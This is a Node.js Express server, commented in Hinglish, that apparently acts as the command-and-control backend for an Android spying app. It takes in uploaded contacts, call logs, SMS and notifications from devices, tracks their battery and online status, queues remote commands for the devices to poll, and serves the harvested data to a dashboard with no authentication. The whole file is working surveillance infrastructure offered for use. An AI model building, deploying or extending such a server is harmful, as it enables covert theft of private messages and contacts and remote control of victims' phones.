const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());

// ZAROORI: Ye dono lines aapke @Field data ko read karengi
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

app.use(express.static(__dirname));

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

let deviceState = {}; 

// --- DASHBOARD API ---
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 30000 : false;
    res.json({ ...state, isOnline });
});

app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 Command Queued: ${command} for ${device_id}`);
    res.json({ status: "success" });
});

// --- ANDROID APP API (Matches your ApiService.java) ---

// 1, 2, 3, 4. Contacts, Calls, SMS, Notifications Upload
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body; // @Field wala data yahan aayega

    if (!device_id || !type || !data) {
        return res.status(400).send("Data missing");
    }

    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(DATA_DIR, fileName);
    
    try {
        // Agar data string hai (Gson.toJson), toh use parse karke save karenge
        let finalData;
        try {
            finalData = JSON.parse(data);
        } catch(e) {
            finalData = data;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        console.log(`📂 [SAVED] ${type} from ${device_id}`);
        res.send("Success");
    } catch (err) {
        console.error("Save error:", err);
        res.status(500).send("Error");
    }
});

// 5. Battery & Online Status
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    if (device_id) {
        deviceState[device_id] = {
            model: model || "Android",
            android_version: android_version || "--",
            battery: battery || 0,
            ringerMode: ringerMode || "normal",
            lastSeen: Date.now(),
            currentCommand: deviceState[device_id]?.currentCommand || "none"
        };
        console.log(`🔋 Status Update: ${device_id} (${battery}%)`);
    }
    res.send("Updated");
});

// 7. Command Check (Aapke Interface ka Point 7)
app.get('/api/get-command/:device_id', (req, res) => {
    const deviceId = req.params.device_id;
    const cmd = deviceState[deviceId]?.currentCommand || "none";
    
    // Command ek baar bhej di toh reset kar do
    if (cmd !== "none") {
        deviceState[deviceId].currentCommand = "none";
        console.log(`📡 Command ${cmd} sent to ${deviceId}`);
    }
    
    // Plain text ya JSON bhej sakte ho, interface ke hisaab se plain response:
    res.send(cmd); 
});

// Dashboard fetch data
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server is live on port ${PORT}`);
});
